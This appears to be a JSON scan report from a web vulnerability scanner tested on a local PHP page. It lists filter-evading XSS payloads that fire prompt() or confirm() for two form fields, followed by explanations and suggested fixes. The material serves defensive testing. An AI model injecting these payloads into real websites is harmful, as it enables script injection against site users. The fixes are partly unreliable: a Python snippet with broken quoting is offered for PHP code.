[
  {
    "url": "http://localhost/WebFortify/site-test/pages/xss.php",
    "list_vulnerability": [
      {
        "payloads": [
          {
            "payload": "<html onmouseover = (prompt)``//"
          },
          {
            "payload": "<d3v onpointerenter = (prompt)``  >v3dm0s"
          },
          {
            "payload": "<details ontoggle = (prompt)``  //"
          },
          {
            "payload": "<details ontoggle = a=prompt,a()  //"
          },
          {
            "payload": "<details onpointerenter = (prompt)``>"
          },
          {
            "payload": "<a onpointerenter = (confirm)()  >v3dm0s"
          },
          {
            "payload": "<html onmouseover = (confirm)()  //"
          },
          {
            "payload": "<html onmouseover = a=prompt,a()  //"
          },
          {
            "payload": "<html onpointerenter = confirm()>"
          },
          {
            "payload": "<d3v onpointerenter = a=prompt,a()  >v3dm0s"
          },
          {
            "payload": "<html onmouseover = a=prompt,a()  >"
          },
          {
            "payload": "<details ontoggle = (confirm)()//"
          },
          {
            "payload": "<a onmouseover = [8].find(confirm)  >v3dm0s"
          },
          {
            "payload": "<details ontoggle = (confirm)()  >"
          },
          {
            "payload": "<details onpointerenter = [8].find(confirm)  >"
          },
          {
            "payload": "<details onpointerenter = a=prompt,a()>"
          }
        ],
        "parameter": "title",
        "corrections": {
          "explanation_xss": "An XSS attack, or Cross-Site Scripting, is a type of computer attack where a hacker injects malicious code, usually JavaScript, into a website. This code is then executed on the browsers of users visiting the compromised site, enabling the hacker to steal personal information, take control of user accounts, or redirect users to malicious sites. XSS attacks exploit vulnerabilities in web applications, often by manipulating input fields or other interactive fields.",
          "line_vuln": "file : C:\\wamp64\\www\\WebFortify\\site-test\\pages\\xss.php line : 40 \n        <input type=\"email\" id=\"title\" name=\"title\" required><br><br>",
          "list_corrections": [
            {
              "title": "Correction Escape the Output",
              "line_correction": "import html \nescaped_string = html.escape('<script>alert('Hello')</script>')\nprint(escaped_string)",
              "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using the escape() function, which escapes malicious special characters. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system."
            },
            {
              "title": "Correction Input Validation",
              "line_correction": "$email = 'test@example.com';\nif (filter_var($email, FILTER_VALIDATE_EMAIL)) \n{echo 'Valid email format';} \nelse {\necho 'Invalid email format';}",
              "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using input validation, which checks user input to ensure that it is valid. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system."
            }
          ]
        }
      },
      {
        "payloads": [
          {
            "payload": "<d3v onmouseover = a=prompt,a()>v3dm0s"
          },
          {
            "payload": "<html onmouseover = (prompt)``  >"
          },
          {
            "payload": "<details onpointerenter = a=prompt,a()//"
          },
          {
            "payload": "<details onpointerenter = (prompt)``  //"
          },
          {
            "payload": "<details onpointerenter = (confirm)()  //"
          },
          {
            "payload": "<a onmouseover = (confirm)()>v3dm0s"
          },
          {
            "payload": "<html onpointerenter = confirm()  //"
          },
          {
            "payload": "<d3v onmouseover = (prompt)``>v3dm0s"
          },
          {
            "payload": "<html onmouseover = (prompt)``  //"
          },
          {
            "payload": "<details ontoggle = confirm()  >"
          },
          {
            "payload": "<a onpointerenter = (prompt)``  >v3dm0s"
          },
          {
            "payload": "<d3v onmouseover = confirm()>v3dm0s"
          },
          {
            "payload": "<details ontoggle = a=prompt,a()  >"
          },
          {
            "payload": "<a onpointerenter = (prompt)``>v3dm0s"
          },
          {
            "payload": "<details ontoggle = confirm()  //"
          },
          {
            "payload": "<a onmouseover = confirm()  >v3dm0s"
          }
        ],
        "parameter": "content",
        "corrections": {
          "explanation_xss": "An XSS attack, or Cross-Site Scripting, is a type of computer attack where a hacker injects malicious code, usually JavaScript, into a website. This code is then executed on the browsers of users visiting the compromised site, enabling the hacker to steal personal information, take control of user accounts, or redirect users to malicious sites. XSS attacks exploit vulnerabilities in web applications, often by manipulating input fields or other interactive fields.",
          "line_vuln": "file : C:\\wamp64\\www\\WebFortify\\site-test\\pages\\xss.php line : 43 \n        <textarea id=\"content\" name=\"content\" rows=\"5\" cols=\"40\" required></textarea><br><br>",
          "list_corrections": [
            {
              "title": "Correction Escape the Output",
              "line_correction": "import html \nescaped_string = html.escape('<script>alert('Hello')</script>')\nprint(escaped_string)",
              "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using the escape() function, which escapes malicious special characters. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system."
            }
          ]
        }
      }
    ]
  }
]